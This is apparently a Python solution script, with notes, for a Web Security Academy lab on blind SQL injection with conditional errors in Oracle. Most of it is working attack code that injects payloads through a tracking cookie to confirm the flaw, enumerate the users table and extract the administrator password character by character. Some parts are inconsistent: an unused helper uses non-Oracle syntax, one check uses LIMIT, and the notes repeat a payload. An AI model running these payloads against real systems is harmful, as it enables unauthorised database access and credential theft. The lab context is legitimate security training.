"""
lab 12 - Blind SQL injection with conditional errors (Oracle database)

Vulnerable parameter - tracking cookie

Objetivo final:
Find out the password of the administrator user
Log in as the administrator user

Analysis:

1) Prove thar parameter is vulnerable

' || (SELECT '' from dual) || ' -> oracle -> status_code = 200
' || (SELECT '' from dualasdasddas) || ' -> status_code = 500

This confirm that is an oracle database

2) Confirm that the users table exists in the database

' || (SELECT '' from users where rownum=1) || ' -> users table exists -> status_code=500

3) Confirm that the administrator user exists in the users table
' || (SELECT '' FROM users WHERE username = 'administrator') || ' -> this query is not useful 

' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || ' -> status code 500-> user administrator exists

' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='asfdsfdasadfafds') || ' -> status code 200-> user administrator doesn't exists

4) Determine length of password

' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and LENGTH(password)>19) || ' 

5) Output the administrator password

' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and LENGTH(password)>19) || ' 
"""


import requests
import sys
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
#proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def sqli_password(url, cookies):
    password_extracted = ""
    for i in range (1,21):
        for j in range(32,126):
            sqli_payload = "' AND (SELECT ASCII(SUBSTRING(password,{0},1)) FROM users WHERE username='administrator' AND LENGTH(password)>1) = '{1}' --".format(i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies['TrackingId'] += sqli_payload_encoded
            r = requests.get(url, cookies=cookies)
            if "Welcome" not in r.text:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            
def mensaje_de_salida(mensaje):
    print(mensaje)
    print('Saliendo del sistema')
    sys.exit(-1)

def obtener_cookies(url):
    cookies = requests.get(url).cookies
    cookies_dict = {cookie.name: cookie.value for cookie in cookies}
    print("Cookies obtenidas:")
    for idx, (name, value) in enumerate(cookies_dict.items(),1):
        print(f"{idx}. {name}: {value}")
    return cookies_dict

def seleccionar_cookie():
    print('Que cookie desea explotar?: ', end="")
    indice =  int(input())
    return (indice - 1)

def confirmar_cookie_explotable(url, cookies, cookie_a_explotar):
    nombre_cookie = list(cookies.keys())[cookie_a_explotar]
    valor_original_cookie = cookies[nombre_cookie]
    
    sqli_payload_200 = "' || (SELECT '' from dual) || '"
    sqli_payload_encoded_200 = urllib.parse.quote(sqli_payload_200)
    cookies_200 = cookies
    cookies_200[nombre_cookie] += sqli_payload_encoded_200
    res_200 = requests.get(url, cookies = cookies_200)
    cookies[nombre_cookie] = valor_original_cookie
    
    sqli_payload_500 = "' || (SELECT '' from tabla_falsa_de_prueba) || '"
    sqli_payload_encoded_500 = urllib.parse.quote(sqli_payload_500)
    cookies_500 = cookies
    cookies_500[nombre_cookie] += sqli_payload_encoded_500
    res_500 = requests.get(url, cookies = cookies_500)
    cookies[nombre_cookie] = valor_original_cookie

    return res_200.status_code == 200 and res_500.status_code == 500

def confirmar_tabla_users(url, cookies, cookie_a_explotar):
    nombre_cookie = list(cookies.keys())[cookie_a_explotar]
    valor_original_cookie = cookies[nombre_cookie]

    sqli_payload = "' AND (SELECT 'x' FROM users LIMIT 1) = 'x' --"
    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
    cookies[nombre_cookie] += sqli_payload_encoded
    res = requests.get(url, cookies = cookies)
    cookies[nombre_cookie] = valor_original_cookie

    return res.status_code == 500

def confirmar_usuario_administrator(url, cookies, cookie_a_explotar):
    nombre_cookie = list(cookies.keys())[cookie_a_explotar]
    valor_original_cookie = cookies[nombre_cookie]
    
    sqli_payload = "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || '"
    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
    cookies[nombre_cookie] += sqli_payload_encoded
    res = requests.get(url, cookies=cookies)
    cookies[nombre_cookie] = valor_original_cookie
    
    return res.status_code == 500

def determinar_longitud_password(url, cookies, cookie_a_explotar):
    nombre_cookie = list(cookies.keys())[cookie_a_explotar]
    valor_original_cookie = cookies[nombre_cookie]
    
    inicio = 0
    fin = 40

    while inicio <= fin:
        longitud_actual = (inicio + fin) // 2
        sqli_payload = f"' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and LENGTH(password)>={longitud_actual}) || '"
        sqli_payload_encoded = urllib.parse.quote(sqli_payload)
        cookies[nombre_cookie] += sqli_payload_encoded
        res = requests.get(url, cookies=cookies)
        cookies[nombre_cookie] = valor_original_cookie
        
        if res.status_code == 500:
            print(f'probando longitud del password: {longitud_actual}')
            inicio = longitud_actual + 1
        else:
            fin = longitud_actual - 1

    return fin
    
def obtener_password(url, cookies, cookie_a_explotar, longitud_password):
    password_extracted = ""
    
    nombre_cookie = list(cookies.keys())[cookie_a_explotar]
    valor_original_cookie = cookies[nombre_cookie]
    
    for i in range (1,longitud_password+1):
        for j in range(32,126):
            sqli_payload = "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and ASCII(SUBSTR(password,{0},1))='{1}') || '".format(i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies[nombre_cookie] += sqli_payload_encoded
            r = requests.get(url, cookies=cookies)
            cookies[nombre_cookie] = valor_original_cookie
            
            if r.status_code == 500:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
                
    return password_extracted

def main():
    url = "https://0a590003032842bf80a2216e001b00e3.web-security-academy.net/"
    cookies = obtener_cookies(url)
    cookie_a_explotar = seleccionar_cookie()
    
    # 1) Confirmar que el parametro es vulnerable a blind SQL Injection
    cookie_es_explotable = confirmar_cookie_explotable(url, cookies, cookie_a_explotar)
    if not cookie_es_explotable:
        mensaje_de_salida('La cookie seleccionada no es explotable')
            
    # 2) Confirmar que existe una tabla users
    existe_tabla_users = confirmar_tabla_users(url, cookies, cookie_a_explotar)
    if not existe_tabla_users:
        mensaje_de_salida('No existe una tabla users')
        
    # 3) Confirmar que el usuario administrator existe en la tabla users
    existe_usuario_administrator = confirmar_usuario_administrator(url, cookies, cookie_a_explotar)
    if not existe_usuario_administrator:
        mensaje_de_salida('No existe el usuario administrador')

    # 4) Enumerar el password de usuario administrator
    longitud_password = determinar_longitud_password(url, cookies, cookie_a_explotar)
    print(f"Longitud del password: {longitud_password} caracteres")
    
    # 5) Ataque de fuerza bruta probando caracter por caracter (se puede implementar un algoritmo de busqueda)
    password = obtener_password(url, cookies, cookie_a_explotar, longitud_password)
    print(f"El password obtenido es: {password}")
    
if __name__ == "__main__":
    main()